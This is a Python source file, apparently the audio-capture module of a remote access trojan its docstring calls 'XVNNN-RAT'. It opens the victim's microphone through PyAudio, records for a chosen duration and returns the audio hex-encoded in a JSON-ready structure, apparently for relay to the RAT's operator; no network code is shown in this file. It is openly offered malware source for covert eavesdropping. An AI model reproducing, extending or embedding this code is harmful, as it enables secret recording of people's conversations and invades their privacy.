"""
Audio module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import logging
import time

logger = logging.getLogger(__name__)


class AudioModule:
    """Audio recording module (Optional - requires pyaudio)"""

    def __init__(self):
        self.name = "audio"
        self.available = False
        self.pyaudio = None
        self.recording = False
        self.audio_data = b""

        # Try to import pyaudio
        try:
            import pyaudio

            self.pyaudio = pyaudio
            self.available = True
            logger.info("Audio module initialized (PyAudio available)")
        except ImportError:
            logger.warning(
                "Audio module: pyaudio not installed. Audio features disabled."
            )

    def record(self, duration=5, sample_rate=44100, channels=1, chunk_size=1024):
        """Record audio for specified duration"""
        if not self.available:
            return {"type": "audio", "error": "PyAudio not installed"}

        try:
            p = self.pyaudio.PyAudio()

            stream = p.open(
                format=self.pyaudio.paInt16,
                channels=channels,
                rate=sample_rate,
                input=True,
                frames_per_buffer=chunk_size,
            )

            frames = []
            self.recording = True

            # Record for specified duration
            for i in range(0, int(sample_rate / chunk_size * duration)):
                if not self.recording:
                    break
                data = stream.read(chunk_size)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            p.terminate()

            self.recording = False

            # Combine frames into single byte string
            audio_data = b"".join(frames)

            return {
                "type": "audio",
                "data": audio_data.hex(),  # Return as hex string for JSON compatibility
                "sample_rate": sample_rate,
                "channels": channels,
                "duration": duration,
            }
        except Exception as e:
            logger.error(f"Audio recording error: {e}")
            return {"type": "audio", "error": str(e)}

    def stop_recording(self):
        """Stop ongoing recording"""
        self.recording = False
        return {"type": "audio", "status": "recording stopped"}
